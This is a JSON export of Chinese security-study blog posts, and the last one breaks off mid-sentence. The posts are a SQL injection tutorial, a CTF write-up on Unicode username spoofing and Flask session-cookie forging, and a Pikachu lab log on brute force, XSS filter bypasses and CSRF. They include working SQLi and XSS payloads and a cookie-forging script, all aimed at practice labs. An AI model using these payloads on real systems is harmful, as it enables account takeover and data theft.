[{"title":"SQL-SQL注入基础","url":"/2021/SQL-SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","content":"SQL-SQL注入基础SQL注入即开发者对用户输入参数没有做到严格过滤，导致用户输入数据能够影响预设的查询功能\n通常表现为数据库原有信息被泄露、篡改，甚至删除\nUNION注入-数字型注入前提：用户通过传入的id等参数，可以从数据库中查询相应的记录\n对字符型注入的判断：判断输入值有无数字运算的特征行为\n例如：输入id=2与id=3-1得到的反馈是相同的，即该注入点为数字型注入\n以pikachu漏洞练习平台上题目为例\nSQL-Inject/数字型注入（post）\n使用BURPSUITE修改post请求\nid=3\n\nid=5-2\n\n可见id值为“3”与id值为“5-2”所得反馈相同\n即该注入点为数字型注入\n使用UNION并入SQL查询语句来干扰正常查询\n在确定为数字型注入后，使用order by 1-99语句查询该数据表的字段数量\nid=1 order by 2\n\n返回界面与id=1时相同\nid=1 order by 3\n\n出现了错误\n即在该环境中，通过order by查询得到的字段数为2\n故union注入的语句如下：\nunion select 1,2\n\n访问id=1 union select 1,2\n\n既执行了id=1的查询，也执行了union后的查询\n指定id=-1或一个很大的值，使其无法正常执行原查询，则会执行union后的查询\n将union select 1,2中的1或2修改成需要的查询语句\n例如：\nid=-1 union select 1,database()或id=-1 union select database(),2\n\ndatabase()函数用于查询当前数据库名，即可得到该数据库名为“pikachu“\n\n之后可通过修改查询语句进行对数据库的查询\n查询表名\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27;\n\n这里只显示第一项记录\n\n在原有数据后面加上”limit 1,1“参数即可显示第二条记录\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 1,1\n\n”limit 1,1“即为条件限定，取查询结果第一条记录的后一条记录\n\n同理”limit 2,1“为限定查询结果第二条记录的后一条记录\n同理”limit 0,100“为限定查询结果的前一百条记录\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,100\n\n\n亦可使用”group_concat“来用”,“联合多行记录\nid=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #查询所有表名或id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27; #查询“pikachu”库下所有表名\n\n\n继续查询所需要的\nid=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;member&#x27;id=-1 union select username,email from member\n\n最后查询对应的”username“与”email“即可\n\nUNION注入-字符型注入GET参数输入的地方包裹单引号，变成字符串\n注入方式：尝试闭合前面单引号，且注释后面的语句\n即：使用单引号闭合前面单引号，使用注释符号注释后面语句\n常用注释：”#”、”/**/“、”–”\n构造时应使用符号的url编码\n空格：”%20“，”#“：”%23“，”‘“：”%27“\nurl中构造\nkobe%27union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23\n\n结果如下：\n\n修改union后面的查询语句即可继续查询所需的内容\n报错注入利用页面报错信息获取数据\n常用于报错注入的函数：\n\nupdatexml()： MySQL对XML文档数据进行查询和修改的XPATH函数\nextractvalue()：MySQL对XML文档数据进行查询的XPATH函数\nfloor()：MySQL中用来取整的函数\n\nUPDATEXML (XML_document, XPath_string, new_value);\n\n第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc\n第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程\n第三个参数：new_value，String格式，替换查找到的符合条件的数据\n作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值\n\n测试题：pikachu漏洞练习平台/数字型注入(post)\n通过报错信息查询数据库名称\nid=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)\n\n\n将database()函数替换为其他查询语句即可\n布尔盲注通过注入得到的真假回显推测出数据\n测试环境：pikachu漏洞练习平台\n添加”and“，”and“两边需同时满足查询才可执行\n测试题：pikachu漏洞练习平台/数字型注入(post)\n判断数据库名的长度\nid=1 and length(database())&gt;=7\n\n执行成功\nid=1 and length(database())&gt;=8\n\n不能执行\n上文可知该数据库名为”pikachu“，为7位字符\n判断数据库的名称\nid=1 and substr(database(),1,1)&gt;&#x27;a&#x27;\n\n执行成功\nsubstr()函数功能为截取，“1,1”即截取database()中从第一个开始字符，返回一个字符，这点与limit不同\n即可使用二分法去猜测字符\nid=1 and substr(database(),1,1)&gt;&#x27;p&#x27;\n\n执行成功\nMySQL自带的截取函数：substring(),mid(),substr()\n将database()函数换成其他查询语句，即可查询所需\n如若改变测试题为：pikachu漏洞练习平台/字符型注入(get)\nget型要注意url编码,而字符型需要构造闭合，且需要注释，故构造如下\nkobe%27%20and%20length(database())&gt;1%23\n\n执行成功\n其他具体查询就与前文类似\n在数字型与字符型分别访问以下两个\nid= 1 or 1=1kobe%27%20or%201=1%23\n\n由于1=1是永真条件，页面定能执行，返回出来的东西还会有惊喜\n时间盲注某些情况下页面回显内容是完全一致的，可通过增加语句执行时需要等待的时间来判断查询是否为有效查询\n测试题：pikachu漏洞练习平台/字符型注入(get)\n访问\nkobe%27%20and%20sleep(3)%23\n\n后台等待三秒才开始执行\n\n判断数据库名\nkobe%27%20and%20if((substr(database(),1,1))=&#x27;p&#x27;,sleep(3),null)%23\n\n延迟了三秒，证明查询成功，数据库名第一个字母为“p”\n可通过这种特性，查询所需内容，具体与布尔盲注类似\n总结注入技巧使用优先级是：UNION注入&gt;报错注入&gt;布尔盲注&gt;时间盲注\n","categories":["CTF-WEB"],"tags":["SQL","基础学习"]},{"title":"BUUCTF-[HCTF 2018]admin","url":"/2021/BUUCTF-%5BHCTF%202018%5Dadmin/","content":"[HCTF 2018]admin进入界面：\n没注册的时候有”login”,”register”两个选项\n\n随随便便就给它注册一个\n诶，这回选择就多了\n可以”index”,”post”,”change password”,”logout”\n\n几次尝试：由提示”admin”入手提示为admin\n那我就乖乖地注册一个admin账户\n哦吼，我滴乖乖\n已经被注册了\n\n那说明什么，这个admin账户指定有点东西\n首先想到的是使用BURPSUITE进行密码爆破\n很显然，似乎是不能爆破，具体原因我不清楚，待大佬指点，记一坑，日后填\n依然由”admin”开始操作，改变大小写注册”Admin”账户假装我是”admin”，以失败告终\n正确姿势进行修改密码时，查看网页源代码\n可以发现提供题目源码的地址\nhttps:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F;\n\n源码如下：\n#!/usr/bin/env python# -*- coding:utf-8 -*-from flask import Flask, render_template, url_for, flash, request, redirect, session, make_responsefrom flask_login import logout_user, LoginManager, current_user, login_userfrom app import app, dbfrom config import Configfrom app.models import Userfrom forms import RegisterForm, LoginForm, NewpasswordFormfrom twisted.words.protocols.jabber.xmpp_stringprep import nodeprepfrom io import BytesIOfrom code import get_verify_code@app.route(&#x27;/code&#x27;)def get_code():    image, code = get_verify_code()    # 图片以二进制形式写入    buf = BytesIO()    image.save(buf, &#x27;jpeg&#x27;)    buf_str = buf.getvalue()     # 把buf_str作为response返回前端，并设置首部字段    response = make_response(buf_str)    response.headers[&#x27;Content-Type&#x27;] = &#x27;image/gif&#x27;    # 将验证码字符串储存在session中    session[&#x27;image&#x27;] = code    return response@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def index():    return render_template(&#x27;index.html&#x27;, title = &#x27;hctf&#x27;)@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def register():    if current_user.is_authenticated:        return redirect(url_for(&#x27;index&#x27;))    form = RegisterForm()    if request.method == &#x27;POST&#x27;:        name = strlower(form.username.data)        if session.get(&#x27;image&#x27;).lower() != form.verify_code.data.lower():            flash(&#x27;Wrong verify code.&#x27;)            return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form=form)        if User.query.filter_by(username = name).first():            flash(&#x27;The username has been registered&#x27;)            return redirect(url_for(&#x27;register&#x27;))        user = User(username=name)        user.set_password(form.password.data)        db.session.add(user)        db.session.commit()        flash(&#x27;register successful&#x27;)        return redirect(url_for(&#x27;login&#x27;))    return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form = form)@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def login():    if current_user.is_authenticated:        return redirect(url_for(&#x27;index&#x27;))    form = LoginForm()    if request.method == &#x27;POST&#x27;:        name = strlower(form.username.data)        session[&#x27;name&#x27;] = name        user = User.query.filter_by(username=name).first()        if user is None or not user.check_password(form.password.data):            flash(&#x27;Invalid username or password&#x27;)            return redirect(url_for(&#x27;login&#x27;))        login_user(user, remember=form.remember_me.data)        return redirect(url_for(&#x27;index&#x27;))    return render_template(&#x27;login.html&#x27;, title = &#x27;login&#x27;, form = form)@app.route(&#x27;/logout&#x27;)def logout():    logout_user()    return redirect(&#x27;/index&#x27;)@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def change():    if not current_user.is_authenticated:        return redirect(url_for(&#x27;login&#x27;))    form = NewpasswordForm()    if request.method == &#x27;POST&#x27;:        name = strlower(session[&#x27;name&#x27;])        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(&#x27;change successful&#x27;)        return redirect(url_for(&#x27;index&#x27;))    return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form)@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def edit():    if request.method == &#x27;POST&#x27;:                flash(&#x27;post successful&#x27;)        return redirect(url_for(&#x27;index&#x27;))    return render_template(&#x27;edit.html&#x27;, title = &#x27;edit&#x27;)@app.errorhandler(404)def page_not_found(error):    title = unicode(error)    message = error.description    return render_template(&#x27;errors.html&#x27;, title=title, message=message)def strlower(username):    username = nodeprep.prepare(username)    return username\n\nUnicode欺骗观察源码\n在末尾定义了一个函数 strlower() \ndef strlower(username):    username = nodeprep.prepare(username)    return username\n\n这个函数在注册、登录、修改密码中都存在\n\n函数主体中 username = nodeprep.prepare(username) \n观察源码第十行 from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep \nnodeprep是从Twisted模块导入\n打开项目的requirements.txt\nFlask==0.10.1Werkzeug==0.10.4Flask_Login==0.4.1Twisted==10.2.0Flask_SQLAlchemy==2.0WTForms==2.2.17 Flask_Migrate==2.2.18 Flask_WTF==0.14.29 Pillow==5.3.0pymysql==0.9.2\n\n其中 Twisted==10.2.0 \n与官网的版本相比较，已是非常古老\n\n利用古老版本的漏洞来作为这一题的突破口\n而这里面就存在Unicode编码的一个问题\n可以知道当使用了nodeprep.prepare()函数之后，如果我们先使用unicode的编码的字符，比如说 ᴬ ，使用该函数之后，他会先变成大写的A，再使用一次就会变成小写的a\n具体字符可查这\n\n下面是我自己使用python尝试了一下项目中的编译\n其中Unicode编码 \\u1d2c\\u1d30\\u1d39\\u1d35\\u1d3a 为”ᴬᴰᴹᴵᴺ”的unicode编码\n\n报错为 raise UnicodeError(“Unassigned code point %s” % repr(c)) 具体问题排查中\n注册”ᴬᴰᴹᴵᴺ”账号\n\n登录进去，猛如虎一顿操作，改一个我的小脑袋瓜子能够记得住的密码\n\n退出该账号\n通过”admin”进行登录\n输入”ᴬᴰᴹᴵᴺ”账号的密码即可进入\n悄咪咪地溜进去悄咪咪地拿到flag最后悄咪咪地走人\n\nSession伪造以下是来自学长的指点：\n\n服务器端是通过seesion区分用户的 \n如果你解密你的seesion\n然后添加管理员权限的标记 \n再加密回去 \n服务器就会认为你是admin\n\n这题的session是存在于本地\n由资料中的文章知flask的session是存在客户端\n随便注册一个账号”beacon”\n登录进去，拿到session\n\n通过以下代码进行解码：\n#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)    decompress = False    if payload.startswith(b&#x27;.&#x27;):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&#x27;Could not base64 decode the payload because of an exception&#x27;)    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception(&#x27;Could not zlib decompress the payload before decoding the payload&#x27;)    return session_json_serializer.loads(payload)if __name__ == &#x27;__main__&#x27;:    print(decryption(str(input(&quot;输入需要解码的Session:&quot;)).encode() ))\n\n解码情况如下：\n\n解码完成之后就是伪造session\n伪造session需要SECRET_KEY\n在项目文件中可以找到\nimport osclass Config(object):    SECRET_KEY = os.environ.get(&#x27;SECRET_KEY&#x27;) or &#x27;ckj123&#x27;    SQLALCHEMY_DATABASE_URI = &#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;    SQLALCHEMY_TRACK_MODIFICATIONS = True\n\nSECRET_KEY为”ckj123&quot;\n“name”由”beacon”修改为”admin”\n进行session加密\n加密代码如下（取自GitHub）\n#!/usr/bin/env python3&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;__author__ = &#x27;Wilson Sumanang, Alexandre ZANNI&#x27;# standard importsimport sysimport zlibfrom itsdangerous import base64_decodeimport ast# Abstract Base Classes (PEP 3119)if sys.version_info[0] &lt; 3: # &lt; 3.0    raise Exception(&#x27;Must be using at least Python 3&#x27;)elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4    from abc import ABCMeta, abstractmethodelse: # &gt; 3.4    from abc import ABC, abstractmethod# Lib for argument parsingimport argparse# external Importsfrom flask.sessions import SecureCookieSessionInterfaceclass MockApp(object):    def __init__(self, secret_key):        self.secret_key = secret_keyif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4    class FSCM(metaclass=ABCMeta):        def encode(secret_key, session_cookie_structure):            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;            try:                app = MockApp(secret_key)                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))                si = SecureCookieSessionInterface()                s = si.get_signing_serializer(app)                return s.dumps(session_cookie_structure)            except Exception as e:                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)                raise e        def decode(session_cookie_value, secret_key=None):            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;            try:                if(secret_key==None):                    compressed = False                    payload = session_cookie_value                    if payload.startswith(&#x27;.&#x27;):                        compressed = True                        payload = payload[1:]                    data = payload.split(&quot;.&quot;)[0]                    data = base64_decode(data)                    if compressed:                        data = zlib.decompress(data)                    return data                else:                    app = MockApp(secret_key)                    si = SecureCookieSessionInterface()                    s = si.get_signing_serializer(app)                    return s.loads(session_cookie_value)            except Exception as e:                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)                raise eelse: # &gt; 3.4    class FSCM(ABC):        def encode(secret_key, session_cookie_structure):            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;            try:                app = MockApp(secret_key)                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))                si = SecureCookieSessionInterface()                s = si.get_signing_serializer(app)                return s.dumps(session_cookie_structure)            except Exception as e:                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)                raise e        def decode(session_cookie_value, secret_key=None):            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;            try:                if(secret_key==None):                    compressed = False                    payload = session_cookie_value                    if payload.startswith(&#x27;.&#x27;):                        compressed = True                        payload = payload[1:]                    data = payload.split(&quot;.&quot;)[0]                    data = base64_decode(data)                    if compressed:                        data = zlib.decompress(data)                    return data                else:                    app = MockApp(secret_key)                    si = SecureCookieSessionInterface()                    s = si.get_signing_serializer(app)                    return s.loads(session_cookie_value)            except Exception as e:                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)                raise eif __name__ == &quot;__main__&quot;:    # Args are only relevant for __main__ usage        ## Description for help    parser = argparse.ArgumentParser(                description=&#x27;Flask Session Cookie Decoder/Encoder&#x27;,                epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)    ## prepare sub commands    subparsers = parser.add_subparsers(help=&#x27;sub-command help&#x27;, dest=&#x27;subcommand&#x27;)    ## create the parser for the encode command    parser_encode = subparsers.add_parser(&#x27;encode&#x27;, help=&#x27;encode&#x27;)    parser_encode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,                                help=&#x27;Secret key&#x27;, required=True)    parser_encode.add_argument(&#x27;-t&#x27;, &#x27;--cookie-structure&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,                                help=&#x27;Session cookie structure&#x27;, required=True)    ## create the parser for the decode command    parser_decode = subparsers.add_parser(&#x27;decode&#x27;, help=&#x27;decode&#x27;)    parser_decode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,                                help=&#x27;Secret key&#x27;, required=False)    parser_decode.add_argument(&#x27;-c&#x27;, &#x27;--cookie-value&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,                                help=&#x27;Session cookie value&#x27;, required=True)    ## get args    args = parser.parse_args()    ## find the option chosen    if(args.subcommand == &#x27;encode&#x27;):        if(args.secret_key is not None and args.cookie_structure is not None):            print(FSCM.encode(args.secret_key, args.cookie_structure))    elif(args.subcommand == &#x27;decode&#x27;):        if(args.secret_key is not None and args.cookie_value is not None):            print(FSCM.decode(args.cookie_value,args.secret_key))        elif(args.cookie_value is not None):            print(FSCM.decode(args.cookie_value))\n\n执行\npython .\\flask_session_cookie_manager.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;3fbbbd4cf0447592eac22fe47104c884df13b3eb75f93a47a15ca80c53c2de846e6606703cb8d1e9bd9ec0f9f124d9edcfc909583cfc8c42fe7eaeca159441ab&#x27;, &#x27;csrf_token&#x27;: b&#x27;ade7afede008694bd78e9ab33291242fb3d9d3d4&#x27;, &#x27;image&#x27;: b&#x27;6xVv&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;\n\n将原session修改成伪造后的session值即可\n\n资料网上一题三解：三种本题解法\nUnicode查询：Unicode character table\nSession相关：session\nSession加密：Session加密\n","categories":["CTF-WEB"],"tags":["练习记录"]},{"title":"pikachu漏洞库练习记录","url":"/2021/pikachu%E6%BC%8F%E6%B4%9E%E5%BA%93%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/","content":"暴力破解概述\nBurte Force（暴力破解）概述\n“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。\n理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：\n1.是否要求用户设置复杂的密码；\n2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；\n3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；\n4.是否采用了双因素认证；\n…等等。\n\n基于表单的暴力破解使用 BURPSUITE 进行暴力破解\n爆破时，选择 Cluster bumb 模式对 Username 与 Password 进行爆破\n Cluster bumb 模式将对爆破目标做笛卡尔积\n此处有三个用户，分别为：\nadmin/123456\npikachu/000000\ntest/abc123\n验证码绕过（on server 与 on client）on server\n验证码在后台不会过期，每一次爆破皆可使用\n爆破时在抓取的数据包中填入正确的验证码即可在每一次爆破中使用验证码\non client\n验证码在前端生成并检查，可被绕过\ntoken防爆破\n1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。\n2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。\n3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。\n\n后端会生成一个token值返回给客户端，当客户端进行请求时，同时携带该token\n与服务端token比对，相同则接受\n本题使用pitchfork进行爆破，不足是爆破点只能选择密码与token值\n在第二个爆破点，即token值进行如下设置\n\n然后在options中\n\n选择原token值\n\n开始爆破前，需将线程数设置为1\n由于第二个爆破选取递归爆破的方式，故线程数只能为1\n爆破后得admin账户密码为123456\n\n该方式一极大弊端为不能连用户名一起进行爆破\n而若连用户名一起进行爆破选择笛卡尔积模式的话\n笔者还没能处理好token值与用户名及密码的关系\n附模块详解：Intruder模块模块详解\n四种爆破模式：爆破模式\ntoken：什么是token\n四种爆破模式大致如下：\n1.sniper　对单点进行爆破，若设置多个爆破点，则使用同一字典对其分别爆破\n2.battering ram　对多个点使用同一字典进行同时爆破\n3.pitch-fork　对不同点使用不同字典分别爆破\n4.cluster bomb　对不同点使用不同字典进行笛卡尔积爆破\nCross-Site Scripting\nXSS（跨站脚本）概述\nCross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：\n1.反射性XSS;2.存储型XSS;3.DOM型XSS;\nXSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。\nXSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。\n形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。\n因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;输出转义：根据输出点的位置对输出到前端的内容进行适当转义;\n\n反射型xss（get）写入 ‘“&lt;&gt;bea123 测试写入的特殊字符会不会被过滤\n\n发现没有过滤字符\n写入xss代码\n&lt;script&gt;alert(&quot;BEACON&quot;)&lt;&#x2F;script&gt; \n\n代码长度受限，通过代码审计修改长度即可\n反射型xss（post）登录后执行相同操作\n存储型XSS\n漏洞描述：xss代码被注入到后台并存储起来，构成持久性危害\n\n同样判断有无过滤字符\n执行同样操作\nDOM型XSS\n漏洞描述：前端数据被DOM获取，并通过DOM又输出到前端(危害低，不会经过后端)\n\n网页源代码\n\n我们先通过 “&gt; 闭合了herf标签，然后再插入相应的payload\n根据提示构造payload ‘\n&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt; \n\nDOM型XSS-X网页源代码\n\n与前面不同的是，前面通过 getElementById 获取到了标签 Id 为 text的内容赋值给str\n然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 Id 为 dom的 div 标签中\n这里则是定义了一个domxss函数\n利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str\n然后经过URL解码和字符串分隔，取出URL中的参数内容\n再把 “+” 替换为 “ ”（空格），赋值给 xss\n最后把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中\n跟前面的DOM不同的是，它的输入是从浏览器的URL中获取的\nXSS之盲打所谓盲打即所插入的内容不会在前端显示，故不能在前端得到相应的反馈\n插入的内容在后端，若插入的xss没有被过滤，则可在后台执行\nxss之过滤对于xss的过滤，主要运用两种思路进行绕过\n首先是转换，将xss命令转换为其他形式，其次则是使用编码的手段\n转换1.抓包重新插入，或修改前端HTML代码\n2.修改大小写，若正则匹配只匹配小写，则可绕过\n3.双写（拼凑），例如\n&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;&#x2F;scri&lt;&#x2F;script&gt;pt&gt;\n\n后台即使过滤script，也有只过滤一次的可能\n4.注释干扰，例如\n&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;&#x2F;sc&lt;!--test--&gt;ript&gt;\n\n加上注释后，有绕过后台过滤机制的可能\n编码\n核心思路：\n后台过滤了特殊字符，比如\n&lt;script&gt;\n\n标签，但该标签可以被各种编码，后台不一定过滤\n当浏览器对该编码进行识别时，会翻译成正常的标签，从而执行\n\n\nxss之htmlspecialchars\n 测试输入 “‘&lt;&gt;?#’666 \n得到反馈\n\n发现该函数在我这里好像没有任何反应\n而其他环境下反应应是如下\n\n需要在payload前后加上单引号’用于闭合herf中的单引号\n构造如下\n&#39; onclick&#x3D;alert(11111) &#39; \n\n而其中只能输入数字\n两个单引号与正文需有一个空格相隔\n后端单引号可去掉，但空格仍需要存在\nxss之href输出此处需了解到javascript伪协议文章地址\n\n伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，\n而是为关联应用程序而使用的.如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript:\n我们可以在浏览地址栏里输入”javascript:alert(‘JS!’);”，点转到后会发现，实际上是把javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。\n将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。这样的URL如下所示：\njavascript:var now = new Date(); &quot;&lt;h1&gt;The time is:&lt;/h1&gt;&quot; + now;\n\n当浏览器装载了这样的URL时，它将执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。这个字符串值可以含有HTML标记，并被格式化，其显示与其他装载进浏览器的文档完全相同。\n在浏览器打开javascript：URL的时候，它会先运行URL中的代码，当返回值不为undefined的时候，前页链接会替换为这段代码的返回值。\njavascript URL还可以含有只执行动作，但不返回值的javascript语句。例如：\njavascript:alert(&quot;hello world!&quot;)\n\n装载了这种URL时，浏览器仅执行其中的javascript代码，但由于没有作为新文档来显示的值，因此它并不改变当前显示的文档。\n通常我们想用javascript:URL执行某些不改变当前显示的文档的javascript代码。要做到这一点，必须确保URL中的最后一条语句没有返回值。一种方法是用void运算符显式地把返回值指定为underfined，只需要在javascript:URL的结尾使用语句void 0;即可。例如：下面的URL将打开一个新的空浏览器窗口，而不改变当前窗口的内容：\njavascript:window.open(&quot;about:blank&quot;); void 0;\n\n如果这个URL没有void运算符，window.open()方法的返回值将被转换成字符串并被显示出来，当前窗口将被如下所示的文档覆盖。\n\nxss之js输出网页源代码如下\n\n则可通过闭合前面\n&lt;script&gt;\n\n来执行我们想要的操作\n即构造payload\n&#x27;&lt;/script&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;\n\n附xss：xss漏洞测试\nxss之htmlspecialchars：PHP htmlspecialchars() 函数\njavascript伪协议：javascript伪协议\nXSS攻击流程假设存在漏洞的是一个论坛，攻击者将恶意的JS代码通过XSS漏洞插入到论文的某一页面中\n当用户访问这个页面时，都会执行这个恶意的JS代码，这个代码就会在用户的浏览器端执行\nXSS攻击类型危害：存储型 &gt; 反射型 &gt; DOM型\n\n反射型：交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询页面等\n存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面\nDOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型\n\nXSS形成原因形成XSS漏洞的主要原因是程序中输入和输出的控制不够严格\n导致“精心构造”的脚本输入后，在输出到前端时被浏览器当作有效代码解析执行\nXSS漏洞测试流程  ① 在目标上找输入点，比如查询接口、留言板\n  ② 输入一组 “特殊字符（&gt;，’，”等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理\n  ③ 通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件（构造闭合）\n  ④ 提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XSS漏洞\nCSRF\nCSRF(跨站请求伪造)概述Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。\n列举场景这里列举一个场景解释一下，希望能够帮助你理解。\n场景需求：\n小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。\n先看下大白是如何修改自己的密码的：\n登录—修改会员信息，提交请求—修改成功。所以小黑想要修改大白的信息，他需要拥有：\n1，登录权限 